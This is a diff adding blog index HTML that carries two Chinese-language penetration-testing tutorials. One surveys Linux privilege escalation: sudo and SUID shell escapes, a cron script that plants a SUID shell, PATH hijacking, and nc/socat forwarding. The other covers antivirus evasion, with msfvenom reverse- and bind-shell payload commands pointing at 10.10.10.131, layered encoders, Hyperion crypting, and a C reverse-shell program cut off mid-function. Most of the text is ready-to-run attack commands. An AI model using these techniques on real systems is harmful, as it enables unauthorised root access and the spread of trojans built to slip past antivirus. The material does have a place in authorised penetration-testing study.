@@ -260,6 +260,1112 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-jie-yi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/29/linux-ti-quan-zong-jie-yi/" itemprop="url">linux提权总结(一)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-29T14:01:42+08:00">
+                2020-04-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/29/linux-ti-quan-zong-shu/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/29/linux-ti-quan-zong-shu/" itemprop="url">linux提权综述</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-29T14:01:07+08:00">
+                2020-04-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p>
+<p>，要判断我们应该先对系统相关的信息进行收集。</p>
+<h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul>
+<li>已经拿到低权限shell</li>
+<li>目标系统上有gcc</li>
+<li>有上传文件的权限</li>
+</ul>
+<p><strong>使用命令</strong>：</p>
+<pre><code>uname -a  或  uname -r</code></pre><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429143857.png" alt=""></p>
+<p>这样，我们就得到了系统的内核版，cpu架构，和发行版等信息</p>
+<p>然后我们就可以使用kali自带的searchsploit来搜索利用代码。</p>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144304.png" alt=""></p>
+<p>这里在推荐一个很好用的工具</p>
+<h5 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux Exploit Suggester"></a>Linux Exploit Suggester</h5><p>​    linux exploit_Suggester是一款根据操作系统版本号自动查找相应<a href="https://www.webshell.cc/tag/tiquan" target="_blank" rel="noopener">提权</a>脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
+<p>下载地址：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p>
+<p>举个例子：</p>
+<pre><code>$ perl ./Linux_Exploit_Suggester.pl -k 3.0.0
+
+Kernel local: 3.0.0
+
+Possible Exploits:
+[+] semtex
+   CVE-2013-2094
+   Source: www.exploit-db.com/download/25444/‎
+[+] memodipper
+   CVE-2012-0056
+   Source: http://www.exploit-db.com/exploits/18411/
+[+] perf_swevent
+   CVE-2013-2094
+   Source: http://www.exploit-db.com/download/26131</code></pre><h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul>
+<li>找到具备利用条件的exp</li>
+<li>上传源代码</li>
+<li>编译exp后执行</li>
+</ul>
+<h5 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h5><pre><code>漏洞描述：
+漏洞编号：CVE-2016-5195
+漏洞名称：脏牛（Dirty COW）
+漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权
+影响范围：Linux kernel &gt;=2.6.22 并且Android也受影响</code></pre><h4 id="明文-root-密码提权"><a href="#明文-root-密码提权" class="headerlink" title="明文 root 密码提权"></a>明文 root 密码提权</h4><p>情况极少。。。。</p>
+<p>passwd 储存了用户，全用户可读，root 可写 shadow 存储密码的 hash，仅 root 可读写</p>
+<p>passwd 文件：</p>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429144854.png" alt=""></p>
+<p>passwd 由冒号分割，第一列是用户名，第二列是密码，x 代表密码 hash 被放在 shadow 里面了（这样非 root 就看不到了）。而 shadow 里面最重要的就是密码的 hash</p>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145009.png" alt=""></p>
+<h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>查看两个文件：</p>
+<pre><code>ls -l /etc/passwd /etc/shadow</code></pre><h5 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h5><ul>
+<li>shadow中存储了用户的密码hash，但是如果passwd可写，将passwd中的x改为一个已知密码的hash，那么系统在验证密码时将以passwd的为准。</li>
+<li>shadow可读的情况下，可以使用john或其他来进行暴力破解hash。</li>
+</ul>
+<h4 id="4、sudo-滥用"><a href="#4、sudo-滥用" class="headerlink" title="4、sudo 滥用"></a><strong>4、sudo 滥用</strong></h4><p>sudo 大家经常遇到，比如执行权限不够时加 sudo 执行，sudo 是让普通用户使用超级用户的命令。其配置文件为 /etc/sudoers，文件定义可以执行 sudo 的账户、定义某个应用程序用 root 访问、是否需要密码验证。</p>
+<p>查看可以执行哪些命令，即不需要知道 root 密码时，需验证自身普通权限的密码</p>
+<p><code>sudo -l</code></p>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429163933.png" alt=""></p>
+<p>可以支持所有命令，下面参考这个网址:</p>
+<blockquote>
+<p><a href="https://gtfobins.github.io/" target="_blank" rel="noopener">https://gtfobins.github.io/</a></p>
+</blockquote>
+<p>这里以 awk、man 举例</p>
+<p><strong>1、su</strong></p>
+<blockquote>
+<p>sudo su</p>
+</blockquote>
+<p>输入普通权限用户密码，切换为 root</p>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164436.png" alt=""></p>
+<p><strong>2、awk</strong></p>
+<blockquote>
+<p>sudo awk ‘BEGIN {system(“/bin/sh”)}’</p>
+</blockquote>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164548.png" alt=""></p>
+<p><strong>3、man</strong></p>
+<blockquote>
+<p>sudo man man</p>
+</blockquote>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164826.png" alt=""></p>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429164919.png" alt=""></p>
+<blockquote>
+</blockquote>
+<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><blockquote>
+<p>ls -l /etc/cron*</p>
+</blockquote>
+<p>非 root 权限的用户是不可以列出 root 用户的计划任务的。但是 /etc/ 内系统的计划任务可以被列出，并且默认这些程序以 root 权限执行 </p>
+<p><strong>重写 python</strong></p>
+<p>若这些计划任务的脚本可写，则编辑为 shell</p>
+<p>crontab 文件是计划任务的配置，此文件只有 root 可写，我们不需要去修改 crontab，只查看里面的有哪些任务，比如定时执行了哪些脚本，再查看对应脚本的权限，若可写，则修改它。</p>
+<p>测试：</p>
+<blockquote>
+<p>cat /etc/crontab</p>
+</blockquote>
+<p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429165555.png" alt=""></p>
+<p>我没有设置定时任务，模拟一下，如果里面有个 <code>1.python</code></p>
+<blockquote>
+<p>ls -al /tmp/1.py //查看是否有w权限 </p>
+<p>cat -al /tmp/1.py //写入代码  import os os.system(‘cp /bin/sh /tmp/sh’) os.system(‘chmod u+s /tmp/sh’) </p>
+</blockquote>
+<p>当到了计划执行时间，就会以 root 权限执行 1.py，即将 /bin/sh 复制到 /tmp/sh</p>
+<p>原本是没有 /tmp/sh</p>
+<p>当执行 <code>sudo python 1.py</code> 时，就会复制到 /tmp/sh </p>
+<p>我们只需要进入 /tmp，执行 ./sh 可获取 root</p>
+<p>这里的 cp 命令是基于 SUID，给 1.py 设置 SUID 权限。可以结合环境变量方式，把 /tmp/sh 添加到环境变量，无需进入 /tmp/sh 去执行 ./sh，执行 sh 变为 root。也可以在 1.py 写入反弹 shell 的 python 代码，此时反弹的 shell 具有 root 权限</p>
+<p><strong>防范：</strong> </p>
+<p>crontab 任务千万不要写到 /etc/crontab 文件里。通过 crontab -e 去创建，让他写到默认的 /var/spool/cron下；创建任务时，避免使用 root 去创建任务，若用 root 创建任务，注意设置权限，避免 root 权限执行任务。</p>
+<h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>​    SUID 是一种特殊的文件属性，它允许用户执行的文件以该文件的拥有者的身份运行,ls 查看时有 s 属性才支持 SUID。比如passwd命令，就是以root权限运行来修改shadow的。</p>
+<p>​    suid提权：</p>
+<p>​    利用拥有suid的文件执行命令，从而提升权限至root</p>
+<h5 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h5><p>常见可用来提权的linux可行性的文件列表如下：</p>
+<ul>
+<li>Nmap</li>
+<li>Vim</li>
+<li>find</li>
+<li>Bash</li>
+<li>More</li>
+<li>Less</li>
+<li>Nano</li>
+<li>cp</li>
+</ul>
+<p>查找系统上运行的所有SUID可执行文件：</p>
+<pre><code>1. find / -user root -perm -4000 -print 2&gt;/dev/null
+2. find / -perm -u=s -type f 2&gt;/dev/null
+3. find / -user root -perm -4000 -exec ls -ldb {} \;</code></pre><p><img src="D:%5Cblog%5Csource_posts%5Clinux%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93-%E4%B8%80%5CQQ%E6%88%AA%E5%9B%BE20200429145451.png" alt=""></p>
+<h5 id="例NMAP"><a href="#例NMAP" class="headerlink" title="例NMAP"></a>例NMAP</h5><p>较旧版本的Nmap（2.02至5.21）具有交互模式，允许用户执行shell命令。由于Nmap在使用root权限执行的二进制文件列表中，因此可以使用交互式控制台来运行具有相同权限的shell。</p>
+<p>交互模式可以通过执行Nmap参数” interactive “</p>
+<pre><code>nmap --interactive</code></pre><p>以下命令将提供一个提升的shell。</p>
+<pre><code>nmap&gt; !sh
+sh-3.2# whoami
+root</code></pre><p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p>
+<pre><code>exploit/unix/local/setuid_nmap</code></pre><h5 id="例Find"><a href="#例Find" class="headerlink" title="例Find"></a>例Find</h5><p>如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p>
+<pre><code>touch pentestlab
+find pentestlab -exec whoami \;</code></pre><pre><code>touch getflag
+find / -type f -name getflag -exec &quot;whoami&quot; \;
+find / -type f -name getflag -exec &quot;/bin/sh&quot; \;</code></pre><h5 id="例VIM"><a href="#例VIM" class="headerlink" title="例VIM"></a>例VIM</h5><p>Vim是Linux环境下的一款文件编辑器。但是，如果以SUID运行的话，它会继承root用户的权限，因此可以读取系统上的所有文件。</p>
+<pre><code>vim.tiny /etc/shadow</code></pre><pre><code>vim.tiny
+# Press ESC key
+:set shell=/bin/sh
+:shell</code></pre><h5 id="例Bash"><a href="#例Bash" class="headerlink" title="例Bash"></a>例Bash</h5><p>以下命令将以root权限打开一个bash shell.</p>
+<pre><code>bash -p
+bash-3.2# id
+uid=1002(service) gid=1002(service) euid=0(root) groups=1002(serv</code></pre><h5 id="例Less"><a href="#例Less" class="headerlink" title="例Less"></a>例Less</h5><p>Less和More都执行以用来提权。</p>
+<pre><code>less /etc/passwd
+!/bin/sh</code></pre><h4 id="8、环境变量劫持-SUID-扩展"><a href="#8、环境变量劫持-SUID-扩展" class="headerlink" title="8、环境变量劫持-SUID 扩展"></a><strong>8、环境变量劫持-SUID 扩展</strong></h4><p>通过劫持环境变量，达到执行任意命令的目的。上述只是执行 cat 命令，但我们最终目的是为了提权，而不是以 root 权限只执行单个 cat 命令。 </p>
+<p>linux 下执行命令，如 cat，是去环境变量查找 ,将 cat 替换</p>
+<p><strong>测试：</strong></p>
+<p>把新建一个 /tmp/cat，而 cat 内容为我们脚本，当用户执行 cat 命令，cat /etc/shadow，则执行我们的脚本 </p>
+<pre class=" language-javascript"><code class="language-javascript">    cat <span class="token operator">></span><span class="token operator">></span> <span class="token operator">/</span>tmp<span class="token operator">/</span>ls <span class="token operator">&lt;</span><span class="token operator">&lt;</span>EOF  
+    #<span class="token operator">!</span><span class="token operator">/</span>usr<span class="token operator">/</span>bin<span class="token operator">/</span>python  
+    print <span class="token string">"this is not the true cat"</span>  
+    print <span class="token string">"here is a root shell!"</span>  
+    <span class="token keyword">import</span> pty<span class="token punctuation">;</span>pty<span class="token punctuation">.</span><span class="token function">spawn</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span>  
+    EOF</code></pre>
+<p>此时再执行 ./suid-exp，可执行我们定义的脚本，因为 suid-exp 以管理员执行 cat 命令，而 linux 的 system 是根据环境变量来执行 cat 的，原本是默认的 cat，当修改了之后，cat 就不再是原来的 cat，而是我们自己定义的脚本，从而达到执行任意命令的目的，即可去提权。</p>
+<h4 id="10、docker-组提权"><a href="#10、docker-组提权" class="headerlink" title="10、docker 组提权"></a><strong>10、docker 组提权</strong></h4><p>docker组用户提权，目的是利用docker组的用户来提权，因为docker组用户在容器下为root权限，通过挂载方式在容器下给本机添加sudo权限的用户，从而可以利用sudo命令。如果没有拥有sudo权限的用户，是无法执行sudo命令，在kali下会提示用户不在sudoers等提示。 </p>
+<p>可以参考我的这篇文章：  《Docker提权实战测试》  <a href="https://www.secquan.org/Discuss/1070515" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1070515</a></p>
+<h4 id="11、服务漏洞"><a href="#11、服务漏洞" class="headerlink" title="11、服务漏洞"></a><strong>11、服务漏洞</strong></h4><blockquote>
+<p>netstat -antup #查看各种网络服务 </p>
+</blockquote>
+<p>然后把敏感端口转发出来，用本地的工具进行攻击，可能拿到远程 root，即通过漏洞拿到 root 权限 windows 用 lcx 做端口转发，linux 用 nc、socat 做端口转发</p>
+<p><strong>1、redis 反弹 shell</strong></p>
+<p>nc 单向转发</p>
+<blockquote>
+<p>nc -l 12345 | nc 192.168.191.170 80</p>
+</blockquote>
+<p>双向转发</p>
+<blockquote>
+<p>mkfifo backpipe nc -l 12345 0&lt;backpipe | nc 192.168.191.170 80 1&gt;backpipe </p>
+</blockquote>
+<p>双向转发本人测试失败，希望大佬们提供解决的办法</p>
+<p>socat</p>
+<p>测试本地转发，service apache2 start，把 80 端口转发到其它端口，看是否能访问，这里测试成功 </p>
+<blockquote>
+<p>socat TCP-LISTEN:8080,fork TCP:192.168.191.170:80 </p>
+</blockquote>
+<p>这里可以参考这篇文章，作者先执行 ps -fu root，发现开放 redis 端口，把 redis 端口转发出来，利用 redis 反弹远程的 root shell。一次简单 linux 提权:</p>
+<blockquote>
+<p><a href="https://www.secquan.org/Discuss/1069715#reply8" target="_blank" rel="noopener">https://www.secquan.org/Discuss/1069715#reply8</a></p>
+</blockquote>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/28/chang-jian-de-liu-liang-cao-kong-he-sui-dao-li-yong-fang-shi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/28/chang-jian-de-liu-liang-cao-kong-he-sui-dao-li-yong-fang-shi/" itemprop="url">重定向技术</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-28T21:20:28+08:00">
+                2020-04-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shu1L">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/04/28/shen-tou-ce-shi-zhi-mian-sha-ru-men/" itemprop="url">渗透测试之免杀入门</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-28T21:18:46+08:00">
+                2020-04-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="渗透测试——免杀部分知识"><a href="#渗透测试——免杀部分知识" class="headerlink" title="渗透测试——免杀部分知识"></a>渗透测试——免杀部分知识</h2><h4 id="1-恶意软件"><a href="#1-恶意软件" class="headerlink" title="1.恶意软件"></a>1.恶意软件</h4><ul>
+<li>病毒、木马、蠕虫、键盘激励、僵尸程序、流氓软件、勒索软件、广告程序</li>
+<li>在用户非自愿的情况下执行安装<ul>
+<li>处于某种恶意的目的：控制、窃取、勒索、偷窥、推送、攻击……</li>
+</ul>
+</li>
+</ul>
+<h4 id="2-防病毒软件"><a href="#2-防病毒软件" class="headerlink" title="2.防病毒软件"></a>2.防病毒软件</h4><ul>
+<li>恶意程序最主要的防护手段<ul>
+<li>杀毒软件/防病毒软件</li>
+<li>客户端/服务器/邮件防病毒</li>
+</ul>
+</li>
+<li>检测原理<ul>
+<li>基于二进制文件中特征签名的黑名单检测方法</li>
+<li>基于行为的分析方法（启发式）</li>
+</ul>
+</li>
+<li>事后手段<ul>
+<li>永远落后于病毒发展</li>
+</ul>
+</li>
+</ul>
+<h4 id="3-免杀技术"><a href="#3-免杀技术" class="headerlink" title="3.免杀技术"></a>3.免杀技术</h4><ul>
+<li>修改二进制文件中的特征字符<ul>
+<li>替换、擦除、修改</li>
+</ul>
+</li>
+<li>加密技术（crypter）<ul>
+<li>通过加密是的特征字符不可读，从而逃避AV 检测</li>
+<li>运行时分片分段的解密执行，注入进程或 AV 不检查的无害文件中</li>
+</ul>
+</li>
+<li>防病毒软件的检测<ul>
+<li>恶意程序本身的特征字符</li>
+<li>加密器 cripter 的特征字符</li>
+</ul>
+</li>
+</ul>
+<h4 id="4-当前现状"><a href="#4-当前现状" class="headerlink" title="4.当前现状"></a>4.当前现状</h4><ul>
+<li>恶意软件制造者<ul>
+<li>编写私有的 RAT 软件，避免普遍被 AV 所知的特征字符</li>
+<li>使用独有 crypter 软件加密恶意程序</li>
+<li>处事低调，尽量避免被发现</li>
+<li>没有能力自己编写恶意代码的黑客，通过直接修改特征码的方式免杀</li>
+<li>Fully UnDetectable 还最高追求 （FUD）</li>
+</ul>
+</li>
+<li>AV 厂商<ul>
+<li>广泛采集样本，尽快发现出现的病毒程序，更新病毒库</li>
+<li>一般新的恶意软件安全 UD 窗口期是一周左右</li>
+<li>乐毅软件制造者永无休止的拉锯战</li>
+<li>信的启发式检测技术尚有待完善(误杀漏杀)</li>
+</ul>
+</li>
+<li>单一 AV 厂商的病毒库很难达到 100% 覆盖<ul>
+<li><a href="https://www.virustotal.com/" target="_blank" rel="noopener">https://www.virustotal.com/</a><ul>
+<li>接口被某些国家的AV软禁免费利用，没有自己的病毒库</li>
+</ul>
+</li>
+<li><a href="http://www.virscan.org/" target="_blank" rel="noopener">http://www.virscan.org/</a></li>
+<li>在线多引擎查杀网站与 AV 查杀共享信息</li>
+<li>搞黑的在线多引擎查毒站<ul>
+<li><a href="https://nodistribute.com/" target="_blank" rel="noopener">https://nodistribute.com/</a></li>
+<li><a href="http://viruscheckmate.com/check/" target="_blank" rel="noopener">http://viruscheckmate.com/check/</a></li>
+</ul>
+</li>
+<li>常用的 RAT 软件<ul>
+<li>灰鸽子、波尔、黑暗彗星、潘多拉、NanoCore</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="5-生成病毒程序"><a href="#5-生成病毒程序" class="headerlink" title="5.生成病毒程序"></a>5.生成病毒程序</h4><h5 id="1-生成程序"><a href="#1-生成程序" class="headerlink" title="1.生成程序"></a>1.生成程序</h5><ul>
+<li>生成反弹 shell</li>
+</ul>
+<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp lhost=10.10.10.131 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><ul>
+<li>加密编码反弹 shell</li>
+</ul>
+<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp lhost=10.10.10.132 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -i 9 -b &#39;\x00&#39; -f exe -o b.exe</code></pre><ul>
+<li>比较编码前后的检测率<ul>
+<li>未经过编码的 a.exe 检测率是 45%</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413174114743.png" alt="在这里插入图片描述"></p>
+<h5 id="2-隐藏shell"><a href="#2-隐藏shell" class="headerlink" title="2.隐藏shell"></a>2.隐藏shell</h5><ul>
+<li>利用模板隐藏 shell</li>
+</ul>
+<pre><code>  root@kali:~# msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=10.10.10.131 lport=4444 -a x86 --platform win -f exe -o c.exe</code></pre><ul>
+<li>多重编码</li>
+</ul>
+<pre><code>  root@kali:~# msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=10.10.10.131 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; d.exe</code></pre><ul>
+<li><p>比较编码前后的检测率</p>
+<ul>
+<li>未经过编码的 c.exe 检测率是 40%</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413174123784.png" alt="在这里插入图片描述"></p>
+<ul>
+<li>经过编码的 d.exe 检测率是 30%</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413174128295.png" alt="在这里插入图片描述"></p>
+</li>
+</ul>
+<h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h4><ul>
+<li>软件开发商为保护版权，采用的混淆和加密技术避免盗版逆向</li>
+<li>常被恶意软件用于免杀目的</li>
+<li>Hyperion （32bit PE 程序加密器）</li>
+<li>Crypter / Container（解密器 PE Loader ）</li>
+</ul>
+<pre><code>  root@kali:~# git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zip
+  root@kali:~# unzip Hyperion-1.2.zip
+  root@kali:~# dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32
+
+  # 生成加密器
+  root@kali:~# cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe
+
+  # 生成木马程序
+  root@kali:~# msfvenom -p windows/shell/reverse_tcp lhost=10.10.10.131 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o p.exe
+
+  # 对木马程序进行加密
+  root@kali:~# wine h.exe p.exe x.exe</code></pre><ul>
+<li><p>比较编码前后的检测率</p>
+<ul>
+<li>未经过编码的 p.exe 检测率是 45%</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413174133640.png" alt="在这里插入图片描述"></p>
+</li>
+<li><p>未经过编码的 x.exe 检测率是 37%</p>
+</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/20190413174137778.png" alt="在这里插入图片描述"></p>
+<h4 id="7-自己编写后门"><a href="#7-自己编写后门" class="headerlink" title="7.自己编写后门"></a>7.自己编写后门</h4><ul>
+<li>Windows reverse shell</li>
+</ul>
+<pre><code>  root@kali:~# wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><ul>
+<li>Linux shellg’c’c</li>
+</ul>
+<pre><code>  root@kali:~# gcc linux_revers_shell.c -o linux
+
+  # 测试程序
+  root@kali:~# nc -nvlp 333
+  root@kali:~# ./linux 127.0.0.1 333</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413174142304.png" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20190413174147316.png" alt="在这里插入图片描述"></p>
+<ul>
+<li>linux_revers_shell.c</li>
+</ul>
+<pre><code>  #include &lt;stdio.h&gt;
+  #include &lt;sys/socket.h&gt;
+  #include &lt;arpa/inet.h&gt;
+  #include &lt;stdlib.h&gt;
+  #include &lt;string.h&gt;
+  #include &lt;unistd.h&gt;
+  #include &lt;netinet/in.h&gt;
+
+  int main(int argc, char *argv[])
+  {
+      struct sockaddr_in sock;
